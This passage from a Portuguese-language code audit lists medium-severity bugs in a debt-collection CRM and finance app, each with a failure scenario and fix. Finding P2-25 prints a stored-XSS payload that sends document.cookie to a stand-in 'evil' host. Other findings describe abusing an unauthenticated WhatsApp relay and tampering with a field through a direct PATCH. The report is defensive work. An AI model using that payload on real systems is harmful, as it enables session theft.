- **Correção sugerida:** Substituir o sentinela `multaAcumulada === 0` por uma flag booleana dedicada (ex.: `multaJaAplicada`), setada na primeira aplicação e nunca resetada por pagamento.

## 4. Achados P2 — médio (50)

### P2-01 · Diagnóstico de repasses pendentes ignora os estados 'revisar' e 'preparado' — some justamente o que precisa de atenção

- **Local:** `api/_diagnostico-financeiro.js:29` · fatia `api-dinheiro` · tipo `code`
- **Cenário de falha:** Recebimento sem acordo vinculado gera operação 'revisar' com capital a apurar; o gestor abre o diagnóstico financeiro e vê operacoes_sem_repasse=0, concluindo que está tudo repassado, enquanto há capital preso aguardando revisão manual.
- **Correção sugerida:** Trocar o filtro para `repasse_status=in.(pendente,revisar,preparado)` ou quebrar em contadores separados por status para que 'revisar' e 'preparado' apareçam no painel.

### P2-02 · Emissor nativo (fin_operacao) ainda marca 'emitida' sem confirmação da prefeitura — falso-positivo que o #246 corrigiu só no avulso

- **Local:** `api/_emitir-nf.js:97` · fatia `idx-nf` · tipo `code`
- **Cenário de falha:** Recebimento confirmado dispara emitir-nf automático; a prefeitura demora ou recusa a NFS-e. fin_operacao fica nf_status='emitida' com nf_url null e nenhum processo reconsulta o Asaas: a nota consta como emitida no financeiro mas não existe (ou foi rejeitada) na prefeitura.
- **Correção sugerida:** Replicar em api/_emitir-nf.js a mesma decisão de status do avulso (AUTHORIZED/pdfUrl→emitida; ERROR→erro+motivo; senão processando) e criar reconciliação para fin_operacao com nf 'processando'.

### P2-03 · Régua marca passo como 'sent' em resposta HTTP 200 do Z-API sem validar o corpo (R-10) — mensagem de cobrança silenciosamente perdida

- **Local:** `api/cron-regua.js:115` · fatia `api-integracoes` · tipo `code`
- **Cenário de falha:** No cron diário, o Z-API está com a instância desconectada e responde 200 com `{"error":"..."}` (sem messageId). A régua trata como sucesso, grava regua_envios.status='sent' para aquele (tipo,devedor,parcela,step) e o devedor NUNCA recebe o lembrete de cobrança/acordo daquele estágio — e o passo jamais é retentado, mesmo após a instância voltar.
- **Correção sugerida:** Em zapiSendText do cron (e em api/_zapi.js, usado pelos demais), após o parse validar que o corpo tem `data.messageId` (ou `zaapId`); se ausente, lançar erro para cair no catch → liberarEnvio (retry no próximo run). Assim a definição de sucesso fica igual à convenção `zap.messageId` já usada nos outros endpoints.

### P2-04 · Endpoint /api/mfa?action=challenge é um relay de WhatsApp SEM autenticação, com telefone e devId controlados pelo cliente

- **Local:** `api/mfa.js:97` · fatia `api-integracoes` · tipo `code`
- **Cenário de falha:** Um terceiro anônimo faz `POST /api/mfa?action=challenge` com `{devId:'qualquer-coisa', telefone:'55XX... (número da vítima)'}` em loop, variando devId a cada chamada para driblar o rate-limit por dev_id. A conta WhatsApp do escritório passa a enviar mensagens 'Seu código de acesso COBRASQ: 123456' para números arbitrários — spam/phishing em nome da COBRASQ e custo/risco de banimento da instância Z-API (exatamente a classe de abuso que a Onda 1b fechou nos outros proxies).
- **Correção sugerida:** Ou desativar/remover api/mfa.js se o fluxo canônico é o RPC portal_emitir_token; ou, mantendo-o, (a) buscar o telefone do devedor no banco a partir do devId e IGNORAR o telefone do corpo, (b) exigir um segredo/origem confiável, e (c) rate-limit por IP/telefone além de por dev_id.

### P2-05 · Paridade admin×CRM não fechada: CRM segue com juros/multa chumbados (0.01/0.02) enquanto o painel lê do admin

- **Local:** `crm.html:2772` · fatia `calc` · tipo `decision`
- **Cenário de falha:** Admin altera jurosMensal para 1,5% no painel: a tela de cadastro/verificação (index) mostra um total; a mensagem de cobrança enviada pelo CRM ao devedor calcula outro (1%) — dois números diferentes para a mesma dívida entre telas.
- **Correção sugerida:** Decidir a fonte única (recomendado: CRM ler os mesmos calcParams do config compartilhado) ou remover a opção de editar juros/multa no admin enquanto o CRM não obedecer.

### P2-06 · registrarFalhaEnvio usa os globais casoAtual/perfilAtual — falha registrada no caso errado

- **Local:** `crm.html:2953` · fatia `crm-pendentes` · tipo `code`
- **Cenário de falha:** Operadora está com o caso do devedor A aberto quando o worker processa uma mensagem agendada do devedor B que falha. crm_envios_falhados recebe uma linha com caso_id do devedor A e a mensagem/telefone do devedor B — qualquer triagem ou retry futuro atribui a falha (e a mensagem, com conteúdo de dívida) ao caso errado.
- **Correção sugerida:** Aceitar caso_id/operador_id como parâmetros de registrarFalhaEnvio e propagá-los de enviarViaZAPI; no worker, passar m.caso_id e m.operador_id.

### P2-07 · crm_envios_falhados e o fallback crm_envios_falhados_local são write-only — o 'retry manual' prometido não existe

- **Local:** `crm.html:2965` · fatia `crm-pendentes` · tipo `code`
- **Cenário de falha:** Z-API fica fora do ar durante um envio em massa: dezenas de falhas são gravadas em crm_envios_falhados (ou no localStorage, se o insert também falhar). Nenhuma tela lista essas pendências; os devedores simplesmente não recebem a cobrança e ninguém percebe, pois o 'retry manual' não tem interface e o fallback local nunca é reenviado.
- **Correção sugerida:** Criar no Admin (junto de renderFalhasReportadas) uma listagem de crm_envios_falhados status='pendente' com botão de reenvio; no init, dar flush de crm_envios_falhados_local para a tabela.

### P2-08 · Resumo pro Astrea nunca descreve o acordo: lê acordo.tipo/acordo.parcela, mas o objeto usa forma/valor

- **Local:** `crm.html:3101` · fatia `crm-geral` · tipo `code`
- **Cenário de falha:** Caso encerrado com acordo boleto 10x de R$ 300: o relatório técnico-jurídico gerado para o Astrea sai como 'foi formalizado acordo de pagamento nas seguintes condições: condições registradas no sistema' — omite valor, parcelas e forma no documento usado como registro jurídico.
- **Correção sugerida:** Trocar `acordo.tipo` por `acordo.forma` e `acordo.parcela` por `acordo.valor` nas linhas 3101-3103.

### P2-09 · Retry silencioso do lock otimista com skipLock sobrescreve alterações concorrentes (perda de histórico)

- **Local:** `crm.html:3550` · fatia `crm-geral` · tipo `code`
- **Cenário de falha:** Operadora A e gestor B abrem o mesmo caso. B adiciona anotação manual; segundos depois A confirma envio de mensagem (histórico dela ainda sem a anotação de B). O lock falha, o retry silencioso com skipLock grava o histórico de A → a anotação de B some do registro (rastreabilidade legal citada no próprio código, linha 7814).
- **Correção sugerida:** No retry, reconstruir as mudanças sobre o caso recarregado (para historico: reaplicar apenas o item novo sobre `casosCache` fresco) em vez de reaplicar o payload antigo; ou mover o append de histórico para RPC no banco (jsonb append atômico).

### P2-10 · Template novo criado no editor nunca ganha `variaveis` — etapa 2 do gerador de peças fica sem campos e a peça sai toda com '_____'

- **Local:** `crm.html:5429` · fatia `crm-casos-peticoes` · tipo `code`
- **Cenário de falha:** Admin cria um template novo em Configurações → Editor de templates usando os chips {{devedor.nome}}, {{divida.valor_original_brl}} etc., salva, e ao usá-lo em 'Gerar peça judicial' a etapa 2 não mostra campo algum; a petição impressa sai com '_____' em todos os lugares das variáveis.
- **Correção sugerida:** No insert de template novo (e na re-versão), gerar `variaveis` a partir de _extrairVariaveisTemplate(conteudo_html) (key/label/tipo text por default, marcando `auto` quando a key estiver em TPL_VARS_DISPONIVEIS), ou adicionar UI de declaração de variáveis.

### P2-11 · Bucket 'avatars' não existe em produção — upload de foto de avatar sempre falha e cai no fallback base64 gravado em profiles.avatar_url

- **Local:** `crm.html:5503` · fatia `crm-casos-peticoes` · tipo `data`
- **Cenário de falha:** Usuário sobe uma foto de 900KB em Configurações → Avatar: o caminho primário (Storage) falha silenciosamente, ~1,2MB de base64 vai para a coluna profiles.avatar_url e passa a ser carregado por todos os operadores em cada renderização de lista de casos; com poucos usuários com foto, cada carregarPerfisAtivos() baixa vários MB.
- **Correção sugerida:** Criar o bucket `avatars` (público ou com policy de leitura autenticada) em produção, ou trocar o upload para o bucket existente `peticao-assets` com path do próprio uid; limitar o fallback base64 ao localStorage (não gravar dataURL em profiles.avatar_url).

### P2-12 · Casos sem cálculo completo oferecem 'Cartão 12x sem juros de R$ 0,00' e geram acordo com valor 0/undefined

- **Local:** `crm.html:6115` · fatia `crm-geral` · tipo `code`
- **Cenário de falha:** Caso sincronizado do faturamento apenas com valor_atual: operadora clica 'Formas de pagamento' e envia ao devedor '3) Cartão de crédito em 12x sem juros de R$ 0,00'; ao 'aceitar', a tela de fechamento e o termo mostram parcela/total R$ 0,00.
- **Correção sugerida:** Em obterMensagens/renderConversa, omitir a opção cartão quando `d.cartao12Parcela` não existir (como já se faz com boleto12 → 'parcelamento indisponível'), e bloquear 'aceitou-cartao'/'aceitou-boleto' sem os campos correspondentes.

### P2-13 · Worker frontend não aplica a régua bloqueada (spam/engano) — envia a números bloqueados

- **Local:** `crm.html:7176` · fatia `crm-pendentes` · tipo `code`
- **Cenário de falha:** Número foi marcado 'spam/engano' na aba WhatsApp > Pendentes; existe uma auto-cobrança agendada para ele. Um operador abre o CRM antes do tick do cron: o worker envia a cobrança ao número bloqueado (possível terceiro que reclamou de engano), violando a regra de negócio e expondo a empresa a reclamação.
- **Correção sugerida:** Replicar a checagem de regua_bloqueada no worker frontend ou remover o worker em favor do cron.

### P2-14 · Worker frontend marca 'falhou' na 1ª falha, anulando a política de 5 tentativas do cron

- **Local:** `crm.html:7185` · fatia `crm-pendentes` · tipo `code`
- **Cenário de falha:** Instância Z-API cai por 2 minutos. Mensagens agendadas vencidas processadas pelo worker do CRM nesse intervalo são marcadas 'falhou' definitivamente na primeira tentativa, enquanto as processadas pelo cron seriam reenviadas até 5 vezes e entregues quando a instância voltasse.
- **Correção sugerida:** Se o worker frontend for mantido: em falha, devolver status='pendente' incrementando tentativas (espelhando o cron) e só marcar 'falhou' após o mesmo limite.

### P2-15 · Auto-cobrança ZapSign sem trava: duas abas/operadores agendam o mesmo lembrete em duplicidade

- **Local:** `crm.html:7256` · fatia `crm-pendentes` · tipo `code`
- **Cenário de falha:** Duas operadoras abrem o CRM de manhã com um caso 'Aguardando assinatura' há 25h. Ambos os clientes avaliam horas>=24 com historico ainda sem 'auto_cobranca_24h' e cada um insere um agendamento; o cron envia os dois e o devedor recebe o mesmo lembrete duplicado. O update concorrente de historico ainda pode perder um dos marcadores.
- **Correção sugerida:** Mover a auto-cobrança para o cron (server-side) ou usar insert idempotente (unique parcial em (caso_id, origem) para origem like 'auto_cobranca_%' com status pendente).

### P2-16 · parsearMoedaInput remove ponto decimal incondicionalmente — valor digitado com ponto vira 100x maior

- **Local:** `crm.html:7454` · fatia `crm-geral` · tipo `code`
- **Cenário de falha:** Operador cria 'Novo acordo avulso' digitando o valor como '1500.00' (formato comum de quem copia de planilha/sistema): o acordo é criado com total R$ 150.000,00 em vez de R$ 1.500,00, propagando para termo, parcelas e histórico.
- **Correção sugerida:** Reutilizar `CalcEngine.parseValor` (já carregado via /templates/calc-engine.js) ou replicar sua lógica: só remover pontos quando existir vírgula na string.

### P2-17 · Relato de falha cai no localStorage em QUALQUER erro e mostra sucesso, mas nunca é sincronizado com falhas_reportadas

- **Local:** `crm.html:8432` · fatia `crm-pendentes` · tipo `code`
- **Cenário de falha:** Operador com sessão expirada relata um bug; o insert falha com erro de JWT, o relato vai para o localStorage dele e ele vê '✓ Relato enviado'. Na tela Admin, renderFalhasReportadas lê a tabela com sucesso (0 linhas) e mostra 'Nenhuma falha reportada. ✨'. O relato nunca chega a ninguém e é perdido em qualquer troca de máquina/origem.
- **Correção sugerida:** No init (com sessão válida), varrer cobrasq_falhas_pendentes e reinserir em falhas_reportadas, limpando o que gravar; e diferenciar o toast quando o relato ficou apenas local.

### P2-18 · ajustarSliderParcelas: fallback do mínimo R$ 256 reduz o nº de parcelas sem recalcular a parcela

- **Local:** `crm.html:8500` · fatia `crm-geral` · tipo `code`
- **Cenário de falha:** Caso com totalAvista R$ 1.200 e sem boletoOptions: operadora arrasta o slider para 12x (parcela ≈ R$ 127 < 256). O loop derruba parcelas até 1, mas mantém parcela ≈ R$ 127 e total ≈ R$ 1.524 → acordoFinal gravado como '1x de R$ 127 · total R$ 1.524', valores inconsistentes que seguem para o termo e o encerramento.
- **Correção sugerida:** Dentro do loop de redução, recalcular o fallback (fator Price + R$ 6) para cada novo `parcelas` quando não houver opção na tabela, em vez de manter o `opt` anterior.

### P2-19 · doLogin('gestor') não valida o papel do app_user — conta com papel 'devedor' entra no app de staff como funcionário

- **Local:** `index.html:5936` · fatia `idx-login-sessao` · tipo `code`
- **Cenário de falha:** Quando houver conta auth com papel='devedor' (portal), essa pessoa digita e-mail/senha na aba 'Gestor'. Sem guarda de papel, montarCurrentUserDeAppUser devolve tipo='funcionario' e o app interno de staff é aberto, expondo carteira/telas administrativas a um devedor.
- **Correção sugerida:** Após carregar o appUser no caminho gestor, rejeitar papéis não-staff: `if(appUser.papel!=='proprietario' && appUser.papel!=='colaborador'){ await supa.auth.signOut(); showToast('Esta conta não tem acesso interno.'); return; }` (ou redirecionar cedente/devedor ao portal correto).

### P2-20 · Login de devedor por CPF+nascimento sempre falha: DB.devedores está vazio para visitante anônimo

- **Local:** `index.html:5986` · fatia `idx-login-sessao` · tipo `code`
- **Cenário de falha:** Devedor sem telefone cadastrado abre o portal no próprio celular, clica 'Não recebi · entrar com data de nascimento', digita CPF e nascimento corretos e clica 'Entrar'. Como DB.devedores está vazio (anônimo não lê o blob staff-only nem o relacional), o find falha e ele vê 'Dados não encontrados' mesmo com dados certos.
- **Correção sugerida:** Validar CPF+nascimento no servidor via uma RPC SECURITY DEFINER (análoga a portal_validar_token) em vez de depender de DB.devedores no cliente anônimo; devolver devedor_id e montar currentUser a partir dele.

### P2-21 · KPI "Carteira ativa" inclui cobranças quitadas não arquivadas, divergindo do próprio Aging

- **Local:** `index.html:8277` · fatia `idx-painel-devedores` · tipo `code`
- **Cenário de falha:** Escritório quita 20 cobranças de R$ 10 mil sem arquivá-las: KPI 'Carteira ativa' segue R$ 200 mil acima do real e diz '20 casos em aberto' a mais, enquanto a barra de Aging (mesma tela) soma R$ 200 mil a menos — gestor não consegue conciliar os números.
- **Correção sugerida:** Excluir status quitado/pago/liquidado de cobrAtivas (ou criar um subconjunto 'emAberto' para o KPI e o aging usarem a mesma base), mantendo quitadas apenas no quadro 'Carteira por situação'.

### P2-22 · KPI "Recuperado no mês" e "Meta do mês" ignoram os filtros Cliente/Operador do painel

- **Local:** `index.html:8289` · fatia `idx-painel-devedores` · tipo `code`
- **Cenário de falha:** Gestor seleciona 'Todos os clientes' → 'Cliente X' no painel: 'Carteira ativa' e 'Em negociação' encolhem para o recorte do cliente, mas 'Recuperado · Junho' continua mostrando o total global (e '45% da meta' calculado sobre o global), levando a leitura errada de performance daquele cliente/operador.
- **Correção sugerida:** Passar o recorte para recuperadoNoMes (filtrar devedores por clienteId/assignedTo conforme _pf) ou, no mínimo, sinalizar na UI que Recuperado/Meta/gráfico são globais e não respondem aos filtros.

### P2-23 · Filtro "Responsável" perde registros legados que só têm assignedTo (UUID)

- **Local:** `index.html:9326` · fatia `idx-painel-devedores` · tipo `code`
- **Cenário de falha:** Gestor filtra 'Responsável: Natália'; devedores atribuídos a ela via CRM (só assignedTo=UUID, sem d.responsavel) somem do resultado e da soma da carteira, embora a tabela sem filtro exiba 'Natália' na coluna Resp. — o gestor conclui erroneamente que a carteira dela é menor.
- **Correção sugerida:** No predicado do filtro, aceitar também o match por roster: `nomeResponsavel(d) === devFilter.resp` (ou armazenar o UUID como value do select e comparar d.assignedTo || resolução por nome).

### P2-24 · Busca da tela Devedores perde o foco a cada tecla digitada

- **Local:** `index.html:9599` · fatia `idx-painel-devedores` · tipo `code`
- **Cenário de falha:** Usuário digita 'mar' no campo 'Buscar nome, CPF, CNPJ…': após o 'm' a página re-renderiza e o campo perde o foco; o 'a' e o 'r' caem fora do input (ou disparam atalhos). A busca só funciona clicando no campo a cada caractere.
- **Correção sugerida:** Após o re-render, re-focar o input e restaurar a posição do cursor (guardar selectionStart antes de renderizar), ou re-renderizar apenas a tabela/lista em vez da página inteira, ou debounce + render parcial.

### P2-25 · XSS armazenado no drawer: dev.doc interpolado em innerHTML sem escape

- **Local:** `index.html:10021` · fatia `idx-painel-devedores` · tipo `code`
- **Cenário de falha:** Cedente (ou planilha importada) cadastra devedor com doc = `<img src=x onerror=fetch('https://evil/x?c='+document.cookie)>`; o gestor clica em 'Ver' na fila de aprovação e o script executa na sessão dele (mesma origem do CRM/Supabase), podendo exfiltrar dados ou agir como gestor.
- **Correção sugerida:** Envolver dev.doc (e h.valor) com escHtml em todas as interpolações de innerHTML do drawer, como já é feito nos campos vizinhos.

### P2-26 · Botão "Registrar pagamento" do drawer abre o modal de contato genérico e não registra pagamento

- **Local:** `index.html:10031` · fatia `idx-painel-devedores` · tipo `code`
- **Cenário de falha:** Operador recebe um pagamento, clica no botão 'Registrar pagamento' do drawer, preenche o modal e salva: nenhuma parcela é marcada como paga, o saldo do devedor não muda e o KPI 'Recuperado · mês' do painel segue zerado — subcontagem sistemática de dinheiro recuperado para quem confia no botão.
- **Correção sugerida:** Apontar o botão para o fluxo real de baixa (aba Acordos/toggleParcela ou um modal de pagamento com valor e data), ou ao menos pré-selecionar tipo 'Pagamento' e converter em baixa de parcela; renomear o botão se a intenção for só registrar contato.

### P2-27 · Página Processos lê campos inexistentes/legados: nº do processo nunca aparece (mostra CPF) e fase judicial fica travada em 'Distribuição'

- **Local:** `index.html:13278` · fatia `idx-cobrancas-acordos` · tipo `code`
- **Cenário de falha:** Gestor abre Processos judiciais para achar o processo 0001234-56.2026.8.16.0131: a busca não retorna nada (campo inexistente), o card mostra o CPF do devedor no lugar do número, e os 7 chips de fase mostram todos os casos empilhados em 'Distribuição' mesmo havendo casos em Execução/Sentença pela etiqueta.
- **Correção sugerida:** Trocar d.numProcesso por d.processoNum nas linhas 13278 e 13356; derivar a 'fase atual' judicial da etiqueta (status) em vez de d.etapa — ex.: mapear as etiquetas judiciais (#227) para os buckets de fasesJud.

### P2-28 · Chips de filtro de Intimações quebrados: JSON.stringify gera aspas duplas dentro de atributo onclick delimitado por aspas duplas

- **Local:** `index.html:13516` · fatia `idx-docs-peticoes` · tipo `code`
- **Cenário de falha:** Na página Intimações & andamentos, clicar em 'Lidas', 'Todas' ou em qualquer chip de fonte não faz nada (erro de sintaxe no console); a tela fica presa no filtro 'Não lidas' para sempre.
- **Correção sugerida:** Trocar por aspas simples no valor: `onclick="_intimacoesState.${key}='${val}';renderIntimacoes();"` (os valores são slugs controlados) ou usar addEventListener.

### P2-29 · Preparar peticionamento: devedor_id recebe o id da COBRANÇA — quebra (FK) quando o invariante cobranca.id==devedor.id não vale

- **Local:** `index.html:13700` · fatia `idx-docs-peticoes` · tipo `code`
- **Cenário de falha:** Devedor com 2ª cobrança (id gerado pelo banco, ≠ devedor.id) e numero_processo preenchido: ao Preparar peticionamento, o insert em proc_peticionamentos viola a FK devedor_id→devedores e o job nunca entra na fila da extensão eproc.
- **Correção sugerida:** Selecionar o devedor real: `select('id, cobranca_partes(devedor_id, principal)')` ou buscar em cobranca_partes o principal, e usar esse id em devedor_id (ou deixar null).

### P2-30 · Trava do 'valor capital' (campo crítico) é só client-side — não há proteção no servidor

- **Local:** `index.html:15610` · fatia `idx-cobrancas-acordos` · tipo `migration`
- **Cenário de falha:** Colaborador mal-intencionado (ou script com o token da sessão dele) faz PATCH /rest/v1/cobrancas?id=eq.X {valor_capital: 1} numa cobrança própria: o saldo de repasses ao cliente passa a ser calculado sobre base errada, sem passar pela confirmação do proprietário e sem trilha.
- **Correção sugerida:** Trigger BEFORE UPDATE em cobrancas que rejeite mudança de valor_capital quando OLD.valor_capital IS NOT NULL e current_user_papel() <> 'proprietario' (mesma classe do trg_enforce_cliente_app_user_id do PR #252).

### P2-31 · R-11 sem guard-rail: Nova cobrança continua aceitando cadastro sem valor e sem credor

- **Local:** `index.html:15644` · fatia `idx-cobrancas-acordos` · tipo `code`
- **Cenário de falha:** Colaborador preenche só o nome do devedor e o tipo, e clica 'Salvar cobrança': nasce uma cobrança com valor_orig=0, valor_atual=0 e cliente_id=null, fora de capital/saldo/recuperado, poluindo listas e relatórios — mesma situação das 9 cobranças vazias de 10-25/06.
- **Correção sugerida:** No salvarCobranca (criação), exigir valor (>0) E credor vinculado, ou oferecer explicitamente 'salvar como rascunho' (is_draft=true) — espelhando a validação que _impSalvar já faz para credor (6742).

### P2-32 · Nova cobrança cria credor novo silenciosamente — contorna a aprovação F-22 e casa com clientes arquivados/rascunho

- **Local:** `index.html:15658` · fatia `idx-cobrancas-acordos` · tipo `code`
- **Cenário de falha:** Colaborador digita 'Movelaria Bordim' (typo de 'Bordin') na Nova cobrança e salva: nasce um segundo cliente sem CNPJ/contato, fora do fluxo de aprovação do gestor, e a carteira do credor real não recebe o caso; relatórios por credor passam a dividir os números entre os dois cadastros.
- **Correção sugerida:** Espelhar o _impSalvar: exigir que o credor seja um cliente já cadastrado (seleção pelo datalist/ID, não texto livre) e, para colaborador, direcionar a criação para o fluxo de pedido de aprovação (solicitarAprovacao('novo_credor')).

### P2-33 · Edição de cobrança apaga cobranca_partes antes do insert, sem rollback — falha no insert deixa a cobrança sem nenhum devedor

- **Local:** `index.html:15699` · fatia `idx-cobrancas-acordos` · tipo `code`
- **Cenário de falha:** Operador edita uma cobrança e, sem perceber, tem o mesmo devedor em duas linhas 'emitente' (autofill por nome). Salvar → delete das partes OK, insert viola uq_cobranca_partes_papel → erro 'responsáveis: duplicate key'. A cobrança fica gravada (o update já passou) porém sem NENHUMA parte: some o devedor da lista, o CRM perde o vínculo e a régua para.
- **Correção sugerida:** Deduplicar `resp` por devedorId+papel antes de gravar; e na edição, só deletar as partes DEPOIS de inserir as novas (ou usar upsert com onConflict e remover as sobras), evitando a janela sem partes.

### P2-34 · Status ZapSign comparado em CAIXA ALTA ('SIGNED') mas a API retorna minúsculo ('signed'/'new') — status corrompe e documento some da fila

- **Local:** `index.html:20824` · fatia `idx-docs-peticoes` · tipo `code`
- **Cenário de falha:** Usuário clica 'Verificar' numa minuta pendente: o status vira 'new', a minuta desaparece da aba 'Aguardando' e do badge de pendentes sem ter sido assinada; quando o devedor assina, 'signed' não casa com 'SIGNED' e a data de assinatura/histórico nunca são registrados.
- **Correção sugerida:** Normalizar: `const novo = String(signer?.status||doc.status||m.zapsignStatus).toUpperCase()` e mapear 'NEW'/'LINK-OPENED' de volta para 'PENDING' antes de gravar.

### P2-35 · KPI "A receber (30d)" soma todo o passivo vencido desde 2022, não só os próximos 30 dias

- **Local:** `index.html:21060` · fatia `idx-financeiro` · tipo `code`
- **Cenário de falha:** Gestor abre o Financeiro e vê "A receber (30d): R$ 56.439", planeja caixa com base nisso, mas só R$ 25.967 têm vencimento nos próximos 30 dias — o resto é inadimplência antiga sem previsão de entrada.
- **Correção sugerida:** Adicionar `.gte('data_vencimento', hojeISO)` à query (ou renomear o card para "A receber em aberto" se a intenção for incluir vencidos).

### P2-36 · Parcelamento com competência nos dias 29–31 pula/duplica mês (overflow de setMonth)

- **Local:** `index.html:21310` · fatia `idx-financeiro` · tipo `code`
- **Cenário de falha:** Usuário parcela uma despesa de 12x com 1ª competência em 31/01/2026: fevereiro fica sem parcela e março recebe duas → "Saídas (fev)" subestimada e "Saídas (mar)" dobrada nos KPIs e no DRE.
- **Correção sugerida:** Clampar o dia ao último dia do mês alvo (ex.: new Date(y, m+i+1, 0) quando o dia estoura) antes de gerar competência/vencimento.

### P2-37 · Transferências entre contas não afetam o saldo realizado por conta

- **Local:** `index.html:22889` · fatia `idx-financeiro` · tipo `migration`
- **Cenário de falha:** Usuário transfere R$ 50.000 do Itaú (sem bank_balance) para o caixa. A aba Contas continua mostrando os R$ 50.000 no Itaú e nada no caixa; o "Fluxo de caixa (14 dias)" da Visão parte de um saldo geral que não reflete a movimentação.
- **Correção sugerida:** Incluir fin_transferencia na RPC fin_saldos_realizados (débito na origem, crédito no destino, quando status=1), ou gerar par de lançamentos neutros ao salvar transferência.

### P2-38 · Relatórios paginam >1000 linhas sem ORDER BY — risco de linhas duplicadas/perdidas na soma

- **Local:** `index.html:24147` · fatia `idx-financeiro` · tipo `code`
- **Cenário de falha:** Com escritas concorrentes (sync Controlle rodando em segundo plano ao abrir o Financeiro), a página 2 do relatório de 2025 retorna parte das linhas já vistas na página 1 → receita do mês aparece duplicada no gráfico e no DRE.
- **Correção sugerida:** Adicionar `.order('id')` (ou data_competencia,id) às queries paginadas de _carregarDadosRelat e sumValor.

### P2-39 · KPIs do Asaas somam apenas a primeira página (100 cobranças) mas se apresentam como totais

- **Local:** `index.html:24328` · fatia `idx-financeiro` · tipo `code`
- **Cenário de falha:** Escritório com 250 cobranças no Asaas, 130 vencidas: o card "Vencido" mostra só a soma das ~100 mais recentes; dezenas de milhares de reais em atraso antigo somem do KPI e do ranking de inadimplência.
- **Correção sugerida:** Paginar via offset até esgotar (ou usar o endpoint de estatísticas do Asaas) para os KPIs; no mínimo sinalizar "parcial (100 de N)" nos cards.

### P2-40 · Corrida entre persistir resolução e Desfazer: dois upserts concorrentes no mesmo telefone podem deixar o banco 'resolvido' com a UI mostrando pendente

- **Local:** `index.html:26002` · fatia `idx-whatsapp-bia` · tipo `code`
- **Cenário de falha:** Operador arquiva e clica 'Desfazer' em <1s numa rede lenta: o upsert 'resolvido' chega após o 'aguardando_humano'. No reload a conversa está em Resolvidas (banco), contradizendo o que o operador viu; se a Bia estiver ativa, ela não é pausada como o estado local sugeria.
- **Correção sugerida:** Encadear: guardar a Promise da persistência e em waPendDesfazer fazer `await promessaResolucao.finally(()=>waPendReabrir(tel))`, ou incluir um campo de versão/updated_at condicional no upsert de reabertura.

### P2-41 · Desfazer do arquivamento em massa reabre só o primeiro telefone no banco — os demais ficam 'resolvido' no servidor apesar da UI restaurar todos

- **Local:** `index.html:26032` · fatia `idx-whatsapp-bia` · tipo `code`
- **Cenário de falha:** Operador seleciona 5 conversas, arquiva em massa e clica 'Desfazer': a UI devolve as 5 à fila, mas no banco 4 continuam resolvidas — após F5 elas somem da fila local restaurada e constam como 'Resolvido' na aba Resolvidas sem ninguém tê-las tratado.
- **Correção sugerida:** Passar o array completo: waPendToast(txt, ()=>{ snap...; tels.forEach(t=>waPendReabrir(t)); ... }) — reabrir todos os telefones arquivados na ação em massa.

### P2-42 · Duplo-clique em 'Responder em 1 toque' / 'Enviar sugestão' envia a mensagem duas vezes ao devedor (sem trava in-flight)

- **Local:** `index.html:26065` · fatia `idx-whatsapp-bia` · tipo `code`
- **Cenário de falha:** Operador clica 2x rápido em 'Confirmar recebimento' (ou o clique 'não pega' e ele repete): o devedor recebe a mesma mensagem duas vezes no WhatsApp; fora do expediente, dois registros idênticos são agendados em crm_mensagens_agendadas e ambos serão enviados pelo worker às 9h.
- **Correção sugerida:** Trava simples: `if(P._enviando) return; P._enviando=true;` no início e liberar no finally, além de `event.target.disabled=true` no clique (mesmo padrão de waPendSugerir).

### P2-43 · Emitir cobranças do acordo ignora o valor negociado (valor_acordo/valor_total) e não ajusta centavos da última parcela

- **Local:** `index.html:28981` · fatia `idx-docs-peticoes` · tipo `code`
- **Cenário de falha:** Acordo gerado com valor_acordo R$ 6.000 (desconto sobre dívida de R$ 10.000, 3 parcelas): ao clicar 'Emitir cobranças', o sistema propõe e cria 3 PIX de R$ 3.333,33 (base 10.000) — devedor cobrado acima do acordo assinado; se a 3ª parcela falhar e o usuário repetir, as 2 primeiras são duplicadas.
- **Correção sugerida:** Usar parseValorBR(campos.valor_acordo||campos.valor_total) com fallback ao cadastro, ajustar a última parcela pela diferença de centavos e usar createInstallment (parcelamento nativo, já existente em 29069) para tornar a emissão atômica.

### P2-44 · Autocomplete de serviços do Asaas insere o ID interno no campo 'Código (LC 116)' e ele é enviado como municipalServiceCode; nada na UI preenche municipalServiceId

- **Local:** `index.html:29514` · fatia `idx-nf` · tipo `code`
- **Cenário de falha:** Conta Asaas com lista de serviços municipais: usuário clica '↻ Carregar serviços do Asaas', escolhe o serviço no autocompletar do campo Código e emite. O payload sai com municipalServiceId:null e municipalServiceCode='<id interno do Asaas>' — todas as notas do lote voltam com erro da prefeitura ('serviço inválido').
- **Correção sugerida:** Ao selecionar uma opção do datalist, gravar `m.asaasId = s.id` (mantendo o código LC 116 à parte), e no `_nfaMunParams` priorizar municipalServiceId quando existir — como já previsto no modelo.

### P2-45 · Restaurar uma nota cancelada na prefeitura devolve nf_status='emitida' — cancelamento irreversível vira reversível no app

- **Local:** `index.html:30038` · fatia `idx-nf` · tipo `code`
- **Cenário de falha:** Nota de R$ 2.429,53 é cancelada na prefeitura via nfaCancelarPref. Depois alguém filtra 'Arquivadas' e clica Restaurar: a nota volta como 'emitida' — a conciliação ISS da competência soma ISS de nota cancelada e o CPF+valor fica travado para a reemissão correta ('duplicada').
- **Correção sugerida:** Em nfaAcoesHist/nfaRestaurar, não oferecer Restaurar quando metadata.cancel existe (ou restaurar para 'cancelada' fixo); cancelamento na prefeitura não deve ser desfazível localmente.

### P2-46 · nfaAtualizarStatus trata CANCELLATION_DENIED como 'cancelada' — nota válida na prefeitura aparece cancelada no app

- **Local:** `index.html:30211` · fatia `idx-nf` · tipo `code`
- **Cenário de falha:** Usuário pede cancelamento de uma nota; a prefeitura nega (CANCELLATION_DENIED). O app marca 'cancelada': o ISS daquela nota some da conciliação da competência (recolhimento a menor) e a tela permite emitir outra nota igual — duplicidade na prefeitura.
- **Correção sugerida:** Tratar CANCELLATION_DENIED como retorno a 'emitida' (com aviso 'cancelamento negado'), reservando 'cancelada' para CANCELED.

### P2-47 · Fonte de beatriz-msg no repo está DESSINCRONIZADA da prod (v26) — redeploy regride o fluxo 'responder'

- **Local:** `supabase/functions/beatriz-msg/index.ts:116` · fatia `edge-workers` · tipo `code`
- **Cenário de falha:** Operador pede sugestão de resposta (intencao='responder') para um telefone sem caso vinculado. Em prod (v26) a Bia responde normalmente com caso=null. Se alguém reimplantar beatriz-msg a partir do fonte do repo, a mesma chamada passa a devolver HTTP 403 'caso não encontrado ou sem acesso' e a funcionalidade de resposta some para números não cadastrados.
